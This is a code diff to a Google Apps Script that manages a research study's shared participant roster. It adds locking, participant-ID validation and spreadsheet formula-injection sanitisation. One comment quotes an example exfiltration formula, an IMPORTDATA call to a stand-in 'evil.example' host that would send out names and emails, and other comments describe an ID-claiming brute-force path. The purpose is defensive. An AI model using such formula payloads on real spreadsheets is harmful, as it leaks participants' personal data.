@@ -1767,12 +1767,20 @@ var G1_APP_DOWNLOAD_URL = "https://drive.google.com/drive/folders/1FDkU52n9EXO92
 // ------------------------------------------------------------
 // P-ID の採番（★ Phase1 のロスターに対して行う）
 // ------------------------------------------------------------
-// Phase1 の nextParticipantId_ と同じ規則（P + 3 桁ゼロ埋め・既存の最大値 + 1）。
-// ⚠️ ★ 実装を 2 つ持つことになるので、**規則を変えるときは両方**（Form_Phase1 側が正）。
+// Phase1 の nextParticipantId_ / O1 の o1NextParticipantId_ と同じ規則
+// （P + 3 桁ゼロ埋め・既存の最大値 + 1）。
+// ⚠️ ★ 実装が 3 つあるので、**規則を変えるときは 3 つとも**（Form_Phase1 側が正）。
+//
+// ⚠️★★★ **2026-09-01: `last > 1` を `last >= 1` に直した**（起票 E-3）。
+//   ★ 旧実装は行が 1 行しか無いロスターを**読まなかった**ので、例えば `P001` だけが
+//   入っているシートに対して `max = 0` のまま **`P001` を返して衝突する**。
+//   ⚠️ 見出し行があっても `^P(\d+)$` に一致しないので無視される。
+//   → ★ 行が 2 行以上あるとき（＝現行ロスター）の結果は **1 バイトも変わらない**。
+//   ★ O1 は 2026-08-28 に同じ修正を入れている（`Form_O1/GSE_O1_Form_Builder.gs:954`）。
 function g1NextParticipantId_(sheet) {
   var max = 0;
   var last = sheet.getLastRow();
-  var values = last > 1 ? sheet.getRange(1, 1, last, 1).getValues() : [];
+  var values = last >= 1 ? sheet.getRange(1, 1, last, 1).getValues() : [];
   for (var i = 0; i < values.length; i++) {
     var m = String(values[i][0]).match(/^P(\d+)$/);
     if (m) {
@@ -1784,8 +1792,107 @@ function g1NextParticipantId_(sheet) {
   return "P" + (next < 1000 ? ("000" + next).slice(-3) : String(next));
 }
 
+/**
+ * ⚠️★★★ **ロスターを触る操作は必ずこれで包む。**（O1 の `o1WithRosterLock_` と同じ）
+ *
+ * ★ 採番は「読んで最大値を出す → 書く」なので、**包まないと同時実行で同じ番号が 2 人に出る**。
+ * ⚠️ 2026-09-01 まで `onG1ConsentSubmit` だけがロックを取り、`assignG1ParticipantId`
+ *   （研究者の手動採番）は**その外側**で走っていた（起票 E-2 系）。
+ *   ★ フォーム提出と手動採番が重なると衝突する。→ **両方をここへ通す。**
+ *
+ * ⚠️★★★ **ただしこれは G1 プロジェクト内の排他にすぎない。**
+ *   ★ `LockService.getScriptLock()` は **スクリプトプロジェクト単位**であり、
+ *   G1 と O1 は**別プロジェクト**である（`Form_G1/README.md:134` / `Form_O1/…:34`）。
+ *   ⚠️ したがって **G1 と O1 の同時採番は、このロックでは防げない**（起票 T-27）。
+ *   ★ `getDocumentLock()` も代替にならない（コンテナ文書＝フォームに紐づき、
+ *     Phase1 ロスターには効かない）。共有ライブラリも**呼び出し側のロック**になる。
+ *
+ * ⚠️★★ **「防ぐ手段が無い」とは書かない**（security-checker 指摘 MED-2・2026-09-01）。
+ *   ★ 正しくは *LockService では* 防げない、である。⚠️ **採番を 1 か所に集約すれば防げる**
+ *   （★ その機構＝ Web App `doPost` は `Form_G1/GSE_G1_Submit.gs` に既にある）。
+ *   → ★ **今回はそれを採らない**という判断であって、原理的に不可能なのではない。
+ *
+ * ⚠️★★ **「気づける」も言い過ぎである。** `g1CountPidRows_` は `flush()` 直後に読むので、
+ *   ★ 「G1 が書く → G1 が数える(=1) → **O1 が書く**」の順序は**捕まえられない** (TOCTOU)。
+ *   → ★ 正しくは「**窓を狭める**」。⚠️ 検知ゼロを「衝突ゼロ」と読まないこと。
+ *
+ * @return {*} `fn()` の戻り値。⚠️ ロックを取れなければ `null`（★ 呼び出し側は中止すること）。
+ */
+function g1WithRosterLock_(fn) {
+  var lock = LockService.getScriptLock();
+  try {
+    lock.waitLock(30000);
+  } catch (lockErr) {
+    Logger.log("❌ ロスターのロックを取得できませんでした（★ 何も書いていません）: " + lockErr);
+    return null;
+  }
+  try {
+    return fn();
+  } finally {
+    lock.releaseLock();
+  }
+}
+
+/**
+ * ⚠️★★★ **共用ロスターへ書く値は必ずこれを通す**（数式インジェクション対策）。
+ *
+ * ★ 氏名欄は自由記入である。⚠️ `=IMPORTDATA("https://evil.example/x?d="&TEXTJOIN(",",1,B2:C200))`
+ *   のような値をそのまま `appendRow` すると **Sheets が数式として格納**する。
+ * ⚠️★★★ **研究者がロスターを開いた瞬間**に Sheets が URL を取りに行き、
+ *   **Phase1 / G1 / O1 で共用している全参加者の氏名とメール**が外部へ出る
+ *   （★ クリックは要らない。`=IMAGE(...)` も同型）。
+ *   ⚠️ 流出先はまさに `docs/o1-deletion-ledger.md` §5b の 1 番＝**対応表そのもの**である。
+ *
+ * ★ 先頭に `'` を付けると Sheets は「文字列」の印として扱い、⚠️ **セルの値には残らない**
+ *   （＝ 研究者が見る表示は変わらない）。
+ *
+ * ⚠️ O1 は 2026-08-29 に `o1PlainText_` として入れていた。★ **G1 には無かった**
+ *   (security-checker 指摘 HIGH-2・2026-09-01)。⚠️ 実測で氏名欄の数式が
+ *   ロスターに**そのまま着地する**ことが確認されている。
+ */
+function g1PlainText_(v) {
+  var s = String(v === null || v === undefined ? "" : v);
+  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
+}
+
+/**
+ * ★ P-ID の形式（`P` ＋ 数字）。⚠️ **採番規則と同じ形**であること
+ * （`g1NextParticipantId_` が `^P(\d+)$` で読むので、そこと食い違わせない）。
+ */
+function g1IsValidPid_(v) {
+  return /^P\d+$/.test(String(v == null ? "" : v).trim().toUpperCase());
+}
+
+/**
+ * ⚠️★★★ **採番した直後に、その P-ID がロスターに 2 行以上無いかを確かめる。**
+ *
+ * ★ なぜ要るか: G1 と O1 は別スクリプトプロジェクトなので `LockService` が効かず、
+ *   **同時に採番すると同じ番号が 2 人に出る**（起票 T-27）。⚠️ これは*防げない*。
+ *   → ★ ならば **黙って通さない**。書いた直後に読み直して、自分の ID が 1 行だけかを見る。
+ *
+ * ⚠️ 検知しても**自動で消したり振り直したりしない**。
+ *   ★ どちらの行が誰のものかはコードには判断できず、消すと被験者のデータが迷子になる。
+ *   → 研究者に見える形で残し、判断させる。
+ *
+ * @return {number} その P-ID を持つ行数。★ 1 なら正常。⚠️ 2 以上は衝突。
+ */
+function g1CountPidRows_(sheet, pid) {
+  var last = sheet.getLastRow();
+  if (last < 1) return 0;
+  var rows = sheet.getRange(1, 1, last, 1).getValues();
+  var want = String(pid).trim().toUpperCase();
+  var n = 0;
+  for (var i = 0; i < rows.length; i++) {
+    if (String(rows[i][0]).trim().toUpperCase() === want) n++;
+  }
+  return n;
+}
+
 // G1 の新規参加者に P-ID を採番し、**Phase1 のロスターに 1 行追加**して返す。
 // ★ 既に Phase1 に参加した人はここを通さない。その人の既存 P-ID をそのまま使う（§2.0）。
+//
+// ⚠️★★ 2026-09-01: **ロックの外で採番していた**のを `g1WithRosterLock_` で包んだ。
+//   ★ フォーム提出（`onG1ConsentSubmit`）と手動採番が重なると同じ番号が出ていた。
 function assignG1ParticipantId() {
   if (!PHASE1_MGMT_SHEET_ID) {
     throw new Error(
@@ -1799,14 +1906,59 @@ function assignG1ParticipantId() {
   if (!sheet) {
     throw new Error("★ Phase1 の管理シートに「参加者ロスター」タブがありません。ID を確認してください。");
   }
-  var pid = g1NextParticipantId_(sheet);
-  sheet.appendRow([pid]);
+
+  var pid = g1WithRosterLock_(function () {
+    var newPid = g1NextParticipantId_(sheet);
+    sheet.appendRow([newPid]);
+    SpreadsheetApp.flush(); // ★ ロック解放前に確定させる
+    var n = g1CountPidRows_(sheet, newPid);
+    if (n > 1) {
+      // ⚠️★★★ 別プロジェクト（O1）と同時採番した可能性が高い。★ 黙って返さない。
+      Logger.log(
+        "⛔⚠️★★★ 採番した " + newPid + " が Phase1 ロスターに **" + n + " 行** あります。\n" +
+          "   ★ G1 と O1 は別スクリプトなので LockService では排他できません（起票 T-27）。\n" +
+          "   ⚠️ 自動では消しません。どの行が誰のものかを研究者が確認してください。"
+      );
+      // ⚠️★★ **提出経路と同じくシートにも出す**（code-reviewer 指摘 M4・2026-09-01）。
+      //   ★ 初版は手動採番だけ Logger 止まりで、「シートに出す」判断が片側にしか
+      //   適用されていなかった。⚠️ 手動採番のほうが研究者が実行ログを閉じがちである。
+      g1RecordRosterConflict_(
+        { pid: newPid, row: 0, reason: "duplicate-pid-rows:" + n },
+        "", // ★ 手動採番には提出者が居ない
+        "⚠️ **採番は済んでいます**（" + newPid + "）。受付メールはこの経路では送りません。"
+      );
+    }
+    return newPid;
+  });
+
+  if (!pid) {
+    throw new Error("★ ロスターのロックを取得できませんでした。何も書いていません。時間をおいて再実行してください。");
+  }
   Logger.log("✅ P-ID を採番しました: " + pid + "（氏名・メールは Phase1 ロスターに手入力）");
   Logger.log("🔗 " + ss.getUrl());
   return pid;
 }
 
 // ログに実アドレスを残さない（data-privacy）。Phase1 の maskEmail_ と同じ考え方。
+/**
+ * ⚠️★★★ **プレーンテキストのメールから Markdown の `**` を落とす**（2026-09-01）。
+ *
+ * ★ `MailApp.sendEmail(to, subject, body)` は **text/plain** で送る。
+ *   ⚠️ したがって本文の `**強調**` は装飾にならず、**記号のまま被験者に見える**。
+ *   ★ 実測（node で本文生成関数を実行）: 受付メール **34〜44 個** / 課題ページメール **18 個**。
+ *
+ * ⚠️★★ **文言そのものは書き換えない。** ★ 本文は `preregistration.md §2.12` の
+ *   開示範囲に合わせて凍結・検査されており（`scripts/check_g1_emails.py`）、
+ *   ⚠️ 語を触ると**その検査と衝突する**。→ ★ **送る直前に記号だけ落とす**。
+ *
+ * ★ 同じ欠陥のページ側は `build_task_pages.py` の `re.S` 修正で閉じた。
+ *   ⚠️ こちらを直すまで「被験者の画面に `**` が出る」は**半分しか塞がっていなかった**。
+ */
+function g1PlainBody_(body) {
+  // ★ 改行をまたぐ強調も落とす（[\s\S] が Python の re.S 相当）。⚠️ 非貪欲にする。
+  return String(body == null ? "" : body).replace(/\*\*([\s\S]+?)\*\*/g, "$1");
+}
+
 function g1MaskEmail_(email) {
   var s = String(email);
   var at = s.indexOf("@");
@@ -1836,28 +1988,105 @@ function sendThankYouEmail(pid, email) {
     G1_CONTACT,
   ].join("\n");
   if (G1_AUTO_SEND) {
-    MailApp.sendEmail(email, subject, body);
+    MailApp.sendEmail(email, subject, g1PlainBody_(body));
     Logger.log("📧 送信しました: " + pid);
   } else {
-    GmailApp.createDraft(email, subject, body);
+    GmailApp.createDraft(email, subject, g1PlainBody_(body));
     Logger.log("📝 下書きを作成しました: " + pid);
   }
   return subject;
 }
 
-// Phase1 ロスターを P-ID またはメールで引く。見つかれば {pid, row} を返す。
+/**
+ * Phase1 ロスターを引く。見つかれば `{pid, row}`、⚠️ 取り違えなら `{conflict: true, ...}`。
+ *
+ * ⚠️★★★ **申告された P-ID をそのまま信用しない**（2026-09-01・起票 E-2）。
+ *   ★ O1 は 2026-08-28 に同じ修正を入れている（`Form_O1/GSE_O1_Form_Builder.gs:989`）。
+ *   ⚠️ **G1 だけが修正前のまま残っていた。**
+ *
+ *   ★ G1-C の参加者ID欄は**自由記入**であり、フォーム URL は被験者に配られる。
+ *     → ⚠️ 打ち間違い（`P015` → `P016`）でも、第三者の申告でも、
+ *       **他人の P-ID を名乗れてしまう**。
+ *   ⚠️ 旧実装は `if (pid && rowPid === pid) return {...}` を**メール一致より先**に
+ *     評価していたので、⚠️ **その行のメールが別人でも素通り**していた。
+ *
+ *   ⚠️★★★ **なぜ G1 の穴が O1 のデータを壊すのか。**
+ *     ★ 採番元の Phase1 ロスターは **Phase1 / G1 / O1 の共用**である
+ *       （`docs/o1-deletion-ledger.md:179`）。
+ *     → ⚠️ G1 経由で名乗った ID が、**O1 の数週間ぶんの常時打鍵ログと同じ P-ID 空間に混ざる**。
+ *     → A さんから削除要求が来たとき `<pid>_o1day*` の削除は
+ *       「**B のデータも消す**」か「**A のを消し残す**」のどちらかになり、
+ *       ⚠️ 同意文書 §4-3 の「消えます」が**履行不能**になる。
+ *
+ * ★ したがって照合の順序を変えた（O1 と同一）:
+ *   1. **メール一致を最優先**する（★ 受付メールを送る先と同じ = 自己整合的）
+ *   2. メールで見つからないときだけ、申告された P-ID を見る
+ *      - ★ その行のメールが**空**なら採用する（氏名だけ先に入れた行を埋める正当な経路）
+ *      - ⚠️ **別のメールが入っていたら `conflict`** —— 発番も送信もせず、研究者に判断させる
+ */
 function g1FindInPhase1Roster_(sheet, opts) {
   var last = sheet.getLastRow();
   if (last < 1) return null;
   var rows = sheet.getRange(1, 1, last, 3).getValues(); // P-ID / 氏名 / メール
   var email = opts.email ? String(opts.email).trim().toLowerCase() : "";
   var pid = opts.pid ? String(opts.pid).trim().toUpperCase() : "";
-  for (var i = 0; i < rows.length; i++) {
-    var rowPid = String(rows[i][0]).trim().toUpperCase();
-    var rowEmail = String(rows[i][2]).trim().toLowerCase();
-    if (pid && rowPid === pid) return { pid: rowPid, row: i + 1 };
-    if (email && rowEmail && rowEmail === email) return { pid: rowPid, row: i + 1 };
+  var i, rowPid, rowEmail;
+
+  // 1. ★ メール一致（★ 最も強い手がかり。本人の受信箱と一致する）
+  if (email) {
+    for (i = 0; i < rows.length; i++) {
+      rowEmail = String(rows[i][2]).trim().toLowerCase();
+      if (rowEmail && rowEmail === email) {
+        rowPid = String(rows[i][0]).trim().toUpperCase();
+        // ⚠️★★ **A 列の値をそのまま P-ID として返さない。**
+        //   ★ 空なら後段が採番して埋める（正当な経路）。
+        //   ⚠️ 空でないのに `P<数字>` でないなら、見出し行・手入力ミス・別の記法である。
+        //     → ★ その値で受付メールを送ると、被験者は**存在しない ID** を信じて入力する。
+        if (rowPid && !g1IsValidPid_(rowPid)) {
+          return { conflict: true, pid: rowPid, row: i + 1, reason: "invalid-pid-in-roster" };
+        }
+        return { pid: rowPid, row: i + 1 };
+      }
+    }
   }
+
+  // 2. ★ 申告された P-ID（⚠️ 検証つき）
+  if (pid) {
+    for (i = 0; i < rows.length; i++) {
+      rowPid = String(rows[i][0]).trim().toUpperCase();
+      if (rowPid !== pid) continue;
+      rowEmail = String(rows[i][2]).trim().toLowerCase();
+      if (!rowEmail) {
+        // ⚠️★★★ **メールが空なだけでは採用しない**（security-checker 指摘 HIGH-1・2026-09-01）。
+        //
+        //   ★ 実測された乗っ取り経路: `assignG1ParticipantId()` は `appendRow([newPid])` で
+        //     **氏名もメールも空の行**を作る（★ ログ自身が「氏名・メールは手入力」と言っている）。
+        //     ⚠️ 研究者が手入力するまでの間、その P-ID を申告した**誰でも**この分岐を通り、
+        //     その ID を受け取り、**自分のメールがその行に書き込まれ**、受付メールが届く。
+        //   ⚠️ P-ID は連番 3 桁・フォーム URL は配布済み・`setCollectEmail(false)` なので
+        //     Google 認証も無い → ★ **総当たりで 20 個も試せば当たる**。
+        //
+        // ★ そこで **氏名が入っている行だけ**採用する:
+        //   - 研究者が「氏名を先に入れた行」を埋めるのは**正当な経路**なので通す
+        //   - ⚠️ 裸の行（氏名も空）は **conflict** にして研究者に判断させる
+        //   ★ 安全側に倒れる: 誤って止めても研究者が確認して再提出してもらえばよい。
+        //
+        // ⚠️★★ 旧文は「**O1 も同じ穴を持つ**（`Form_O1/GSE_O1_Form_Builder.gs:1022`）。
+        //   ★ 別 PR で同じ修正を入れること」と書いていた。
+        //   ★ **2026-09-03 に O1 へ移植した**（`bare-row-claim` / `email-mismatch` とも）。
+        //   ⚠️ 移植時に列構成を読み比べ、`O1_ROSTER_HEAD` が G1 と同じ並びであることを確認した。
+        //   → ★ **両側が塞がった。** ⚠️ ただし T-27（プロジェクト跨ぎの二重採番）は別問題で残る。
+        var rowName = String(rows[i][1] == null ? "" : rows[i][1]).trim();
+        if (!rowName) {
+          return { conflict: true, pid: rowPid, row: i + 1, reason: "bare-row-claim" };
+        }
+        return { pid: rowPid, row: i + 1 }; // ★ 氏名がある = 研究者が用意した行
+      }
+      // ⚠️★★★ 別人のメールが入っている行を名乗っている。
+      return { conflict: true, pid: rowPid, row: i + 1, reason: "email-mismatch" };
+    }
+  }
+
   return null;
 }
 
@@ -1893,6 +2122,82 @@ function g1EnsureRunRow_(pid) {
   var row = Math.max(last + 1, 3);
   sh.getRange(row, colPid).setValue(pid);
   return sh.getRange(row, colNote);
+}
+
+/**
+ * ⚠️★★★ **ロスターの取り違え / 二重採番を、研究者が普段見るシートに出す。**
+ *
+ * ★ なぜ Logger だけにしないか: O1 は `Logger.log` で止めているが、
+ *   ⚠️ **研究者が Apps Script の実行ログを見に行くまで誰も気づかない**。
+ *   ★ 「警告が出ていない」を「問題が無い」と読ませないために、シートへ出す
+ *   (memory `silent-success-is-not-visible` / 研究者判断 2026-09-01)。
+ *
+ * ⚠️★★ **申告された P-ID の行には書かない。**
+ *   ★ conflict のとき `pid` は**他人のもの**なので、その人のトラッキング行に書くと
+ *     ⚠️ **無関係な被験者の記録を汚す**。→ 専用の行に積む。
+ *
+ * ⚠️★★★ **その専用行の P-ID 列は「空」にする。** ★ 当初 `⚠要確認` という印を入れたが、
+ *   実際に消費者を grep したところ **`submissionPids_`（:1069・「行の真実源」）が
+ *   `if (pid && ...)` で拾ってしまい、⚠️ 存在しない参加者を 1 人として数える**ことが分かった。
+ *   ★ P-ID 列を空にすれば、`submissionPids_` も `refreshG1RunSheet`(:3406) も
+ *   `g1CollectPendingMaterials_`(:3091) も `if (!pid) continue` 相当で**自然に除外する**。
+ *   → ⚠️ 印は備考の文頭 `⚠★要確認` が担う（★ 人には見え、機械は数えない）。
+ *
+ * ⚠️ 実名・メールアドレスは**書かない**（`data-privacy`）。マスクした形だけ残す。
+ *
+ * @param {{pid: string, row: number, reason: string}} found
+ * @param {string} email ★ 提出者のメール（⚠️ マスクして書く）
+ * @param {string} outcome ⚠️★★★ **実際に何をしたか**を書く文字列。
+ *   ★ 固定文にしてはいけない —— 初版は常に「発番も受付メールもしていません」と書いていたが、
+ *   ⚠️ 重複検知の経路では**発番済み**だったので、**研究者の見るシートに嘘が載っていた**
+ *   (code-reviewer 指摘 H3・2026-09-01)。★ 「警告が無い＝安全」の裏返しで、
+ *   **虚偽の安心**が最も避けたい形である。
+ */
+function g1RecordRosterConflict_(found, email, outcome) {
+  try {
+    var props = PropertiesService.getScriptProperties();
+    var ssId = props.getProperty(MGMT_SHEET_PROP_G1);
+    if (!ssId) {
+      Logger.log("⚠️ G1 管理シートが未作成なので conflict をシートに出せません（Logger のみ）");
+      return false;
+    }
+    var sh = SpreadsheetApp.openById(ssId).getSheetByName("G1 実施トラッキング");
+    if (!sh) {
+      Logger.log("⚠️ 「G1 実施トラッキング」タブが無いので conflict をシートに出せません（Logger のみ）");
+      return false;
+    }
+    try {
+      assertRunHeader_(sh);
+    } catch (headerErr) {
+      Logger.log("❌ ヘッダ不一致のため conflict をシートに出せません（Logger のみ）: " + headerErr);
+      return false;
+    }
+    var colNote = runCol_("備考");
+    var row = Math.max(sh.getLastRow() + 1, 3);
+    // ⚠️★★★ **P-ID 列は空のままにする**（上の注記を参照）。
+    //   ★ ここに何か書くと `submissionPids_` が参加者として数える。
+    // ⚠️★★ **ここも `g1PlainText_` で包む。** 現状この文字列は `⚠★要確認` で始まるので
+    //   数式にはならないが、★ **それは連結順のおかげ**にすぎない。
+    //   ⚠️ 実測: `g1MaskEmail_("=x@evil.com")` は **`=***@evil.com`** を返す ——
+    //   つまり材料の中に数式の起点が混ざりうる。★ 誰かが文言を並べ替えた瞬間に
+    //   **黙って数式になる**。→ 安全を並び順に依存させない。
+    sh.getRange(row, colNote).setValue(
+      g1PlainText_(
+      "⚠★要確認 ロスター取り違えの疑い（" + (found.reason || "conflict") + "）: " +
+        "申告ID=" + found.pid + " / ロスター行=" + (found.row || "-") +
+        " / 提出者=" + g1MaskEmail_(email) +
+        " ★ " + (outcome || "★ 何をしたかが記録されていません（⚠️ 呼び出し側の不備）") +
+        " 研究者が確認してください。"
+      )
+    );
+    SpreadsheetApp.flush();
+    Logger.log("📝 conflict を「G1 実施トラッキング」の " + row + " 行目（P-ID 列は空・備考に ⚠★要確認）に記録しました");
+    return true;
+  } catch (err) {
+    // ⚠️ ここで throw すると発番の巻き戻しに見えるので握るが、★ 黙らせない。
+    Logger.log("❌ conflict をシートに記録できませんでした（★ Logger には残っています）: " + err);
+    return false;
+  }
 }
 
 /**
@@ -2504,10 +2809,10 @@ function sendTaskMaterialsEmail(pid, email, url) {
   var subject = g1MaterialsSubject_();
   var body = g1MaterialsBody_(pid, url);
   if (G1_AUTO_SEND) {
-    MailApp.sendEmail(email, subject, body);
+    MailApp.sendEmail(email, subject, g1PlainBody_(body));
     Logger.log("📧 事前資料メールを送信しました → " + g1MaskEmail_(email) + "（" + pid + "）");
   } else {
-    GmailApp.createDraft(email, subject, body);
+    GmailApp.createDraft(email, subject, g1PlainBody_(body));
     Logger.log("📝 事前資料メールの下書きを作成しました → " + g1MaskEmail_(email));
     Logger.log("   ⚠️ ★ 下書きのままでは被験者に届きません。Gmail から送信してください。");
   }
@@ -3389,38 +3694,125 @@ function onG1ConsentSubmit(e) {
     return;
   }
 
-  // ★ 同時提出で同じ P-ID が 2 人に出るのを防ぐ（Phase1 と同じ）。
-  var lock = LockService.getScriptLock();
-  try {
-    lock.waitLock(30000);
-  } catch (lockErr) {
-    Logger.log("❌ ロックを取得できませんでした。手動で assignG1ParticipantId してください: " + lockErr);
+  // ⚠️★★ **申告された参加者ID の形式を検証する**（code-reviewer 指摘 H2・2026-09-01）。
+  //   ★ `Q_C_PID` は自由記入なので `P15` `p-015` `015` のような打ち間違いが入る。
+  //   ⚠️ 旧実装はロスターに一致しないだけで**黙って「新規参加者」として扱い**、
+  //     ★ メールが未登録の既存参加者に **2 つ目の P-ID を発番**しうる。
+  //   → ★ 形式が違うなら**何もせず止める**（⚠️ 勝手に解釈して直さない）。
+  //   ★ O1 は `Form_O1/GSE_O1_Form_Builder.gs:1495` に同じ検査がある。⚠️ G1 に無かった。
+  if (a.pid && !g1IsValidPid_(a.pid)) {
+    Logger.log(
+      "⛔⚠️ 申告された参加者IDの形式が違います: 「" + a.pid + "」（★ 期待する形は P と数字）。\n" +
+        "   ★ 発番も受付メールも行いませんでした（⚠️ 黙って新規発番しない）。\n" +
+        "   ★ 研究者が本人に確認し、正しい ID で再提出してもらってください。\n" +
+        "   提出者: " + g1MaskEmail_(a.email)
+    );
     return;
   }
 
-  try {
+  // ★ 同時提出で同じ P-ID が 2 人に出るのを防ぐ（Phase1 と同じ）。
+  // ⚠️ 2026-09-01: 手書きのロックを `g1WithRosterLock_` に寄せた。
+  //   ★ `assignG1ParticipantId`（手動採番）が**同じロックを通る**ようにするため。
+  var locked = g1WithRosterLock_(function () {
     var roster = SpreadsheetApp.openById(PHASE1_MGMT_SHEET_ID).getSheetByName("参加者ロスター");
     if (!roster) {
       Logger.log("❌ Phase1 の管理シートに「参加者ロスター」タブがありません（発番中止）");
-      return;
+      return null;
     }
 
     // 1) 既存の人か（★ 再提出でも再発番しない = 冪等。Phase1 参加者は既存 ID をそのまま使う）
     var found = g1FindInPhase1Roster_(roster, { pid: a.pid, email: a.email });
+
+    // ⚠️★★★ 申告された P-ID の行に**別人のメール**が入っている（またはロスターの
+    //   P-ID の形が壊れている）。★ 発番も受付メールも行わない。
+    if (found && found.conflict) {
+      Logger.log(
+        "⛔⚠️★★★ 申告された参加者ID（" + found.pid + "・ロスター " + found.row + " 行目）に\n" +
+          "   **別のメールアドレスが登録されています**（" + (found.reason || "conflict") + "）。\n" +
+          "   ★ 発番も受付メールも行いませんでした。\n" +
+          "   提出者: " + g1MaskEmail_(a.email) + "\n" +
+          "   ★ 打ち間違いか、他人の ID の申告かを研究者が確認してください。\n" +
+          "   ⚠️ 自動で新規発番はしません（★ 同じ人に 2 つの ID を作らないため）。"
+      );
+      // ⚠️★★ O1 は Logger だけで止めている。★ G1 では**シートにも出す** ——
+      //   研究者が実行ログを見に行くまで気づけないのは silent failure と同じだから
+      //   (memory `silent-success-is-not-visible` / 研究者判断 2026-09-01)。
+      g1RecordRosterConflict_(found, a.email, "発番も受付メールもしていません。");
+      return null;
+    }
+
     var pid;
     var isNew = false;
-    if (found && found.pid) {
+    if (found) {
+      // ⚠️★★★ **A 列（P-ID）が空の行**に当たることがある（★ 氏名とメールだけ先に入れた行）。
+      //   ★ その場合は **appendRow へ落とさず、その行に採番して埋める**。
+      //   ⚠️ 落とすと同じメールに 2 行目ができ、**1 人に 2 つの識別子**ができる
+      //     —— ★ 再提出のたびに新しい P-ID と受付メールが発生する。
+      //   ⚠️ O1 は `Form_O1/…:1542-1554` で直していた (2026-08-28)。★ **G1 に移植し損ねていた**
+      //     (code-reviewer 指摘 H1 / security-checker MED-1・2026-09-01)。
       pid = found.pid;
-      Logger.log("♻️ 既存の参加者として扱います: " + pid + "（" + g1MaskEmail_(a.email) + "）");
+      if (!pid) {
+        pid = g1NextParticipantId_(roster);
+        roster.getRange(found.row, 1).setValue(pid);
+        isNew = true;
+        Logger.log("✅ 既存行（P-ID が空）に採番して埋めました: " + pid + " 行 " + found.row);
+      } else {
+        Logger.log("♻️ 既存の参加者として扱います: " + pid + "（" + g1MaskEmail_(a.email) + "）");
+      }
       if (!String(roster.getRange(found.row, 3).getValue()).trim()) {
-        roster.getRange(found.row, 3).setValue(a.email);
+        // ⚠️ 数式インジェクション対策を通す（`g1PlainText_`）。
+        roster.getRange(found.row, 3).setValue(g1PlainText_(a.email));
       }
     } else {
       pid = g1NextParticipantId_(roster);
-      roster.appendRow([pid, a.name, a.email]);
+      // ⚠️★★★ **生の値を書かない。** 氏名欄は自由記入で、`=IMPORTDATA(...)` を入れられると
+      //   研究者がロスターを開いた瞬間に**共用の対応表が丸ごと外部へ出る**
+      //   (security-checker 指摘 HIGH-2・2026-09-01)。
+      roster.appendRow([pid, g1PlainText_(a.name), g1PlainText_(a.email)]);
       isNew = true;
-      SpreadsheetApp.flush(); // ★ ロック解放前に確定させる
       Logger.log("✅ P-ID 発番: " + pid + "（" + g1MaskEmail_(a.email) + "）");
+    }
+
+    // ⚠️★★★ **重複検知は「pid が確定したあと」に 1 か所だけ置く**
+    //   （cross-review 両者一致 HIGH・2026-09-01）。
+    //
+    //   ⚠️ 初版はこれを **`else`（新規 append）の中にだけ**書いていた。
+    //     ★ その結果、**既存行の P-ID 空欄を埋める経路が素通り**していた ——
+    //     `flush()` も `g1CountPidRows_()` も通らず、⚠️ **重複したまま受付メールを送った**。
+    //   ★ 移植元の O1 は `Form_O1/…:1605` で **ロックの外・関数の最後に 1 回だけ**呼び、
+    //     どちらの書き込み経路で確定した pid でも一律に見ている。
+    //     ⚠️ 私は「新規経路にだけ」付けてしまい、**O1 のカバレッジを落として移植**していた。
+    //   → ★ 分岐ごとに書かない。**確定後に 1 か所**にする（片方だけ直る事故を構造で防ぐ）。
+    //
+    // ⚠️★★★ 別プロジェクト（O1）との同時採番は LockService では防げない（起票 T-27）。
+    //   ★ **これは「防ぐ」仕組みではなく、窓を狭めるだけ**である ——
+    //     ⚠️ 読み返した**あと**に O1 が同じ P-ID を append する順序 (TOCTOU) は捕まえられない。
+    //   → ★ 役割は「**気づけない状態を無くす**」ことである。
+    SpreadsheetApp.flush(); // ★ ロック解放前に確定させる
+    var dup = g1CountPidRows_(roster, pid);
+    if (dup > 1) {
+      Logger.log(
+        "⛔⚠️★★★ **同じ P-ID が " + dup + " 行あります**: " + pid + "\n" +
+          "   ★ 受付メールは**送っていません**（⚠️ 重複した ID を配ると回収できません ——\n" +
+          "      ★ その ID で `.age` / `metrics/<PID>/` が作られ、2 人ぶんが 1 つに混ざる）。\n" +
+          "   ⚠️ 別プロジェクト（O1 / Phase1）と**同時に採番された**可能性があります ——\n" +
+          "      ★ LockService はスクリプト プロジェクト単位で、跨いだ排他は効きません（T-27）。\n" +
+          "   ★ どちらの行を残すかは**研究者が決めてください**（⚠️ 自動では直しません）。\n" +
+          "   ★ 直したあと、提出者にもう一度提出してもらえば同じ経路で受付メールが送られます。\n" +
+          "   提出者: " + g1MaskEmail_(a.email)
+      );
+      // ⚠️★★★ **outcome を正確に書く。** 初版は固定文「発番も受付メールもしていません」で、
+      //   ⚠️ この経路では**発番済み**だったため**シートに嘘が載っていた**
+      //   (code-reviewer 指摘 H3)。★ 虚偽の安心は silent failure の裏返しである。
+      g1RecordRosterConflict_(
+        { pid: pid, row: 0, reason: "duplicate-pid-rows:" + dup },
+        a.email,
+        (isNew ? "⚠️ **発番は済んでいます**（" : "⚠️ **この ID を割り当て済みです**（") +
+          pid + "）が、受付メールは送っていません。"
+      );
+      // ⚠️★★ O1 (`Form_O1/…:1621`) と同じく **ここで止める**。
+      //   ★ 重複した ID を被験者に渡すと回収できない。
+      return null;
     }
 
     // 2) G1 実施トラッキングに行を用意する（★ 実名・メールは書かない）
@@ -3431,29 +3823,29 @@ function onG1ConsentSubmit(e) {
     try {
       // ★★ 2026-08-07: 課題ページのフォルダが**もう用意できていれば、この 1 通で全部渡す**。
       //    ⚠️ 用意できていなければ従来どおり 2 便に落ちる（壊れない）。
-      var found = { url: "", problem: "" };
+      var materials = { url: "", problem: "" };  // ⚠️ 旧名 `found` は本人確認の結果と衝突する（var は関数スコープ）
       try {
-        found = g1MaterialsUrlForPid_(pid);
+        materials = g1MaterialsUrlForPid_(pid);
       } catch (lookupErr) {
-        found = { url: "", problem: "探索に失敗: " + lookupErr };
+        materials = { url: "", problem: "探索に失敗: " + lookupErr };
       }
-      if (found.url) {
+      if (materials.url) {
         Logger.log("✅ 課題ページのフォルダが見つかったので、受付メール 1 通で渡します: " + pid);
       } else {
-        Logger.log("ℹ️ 課題ページは別便になります（" + found.problem + "）");
+        Logger.log("ℹ️ 課題ページは別便になります（" + materials.problem + "）");
       }
       var subject = g1RegisterAckSubject_();
-      var body = g1RegisterAckBody_(pid, found.url);
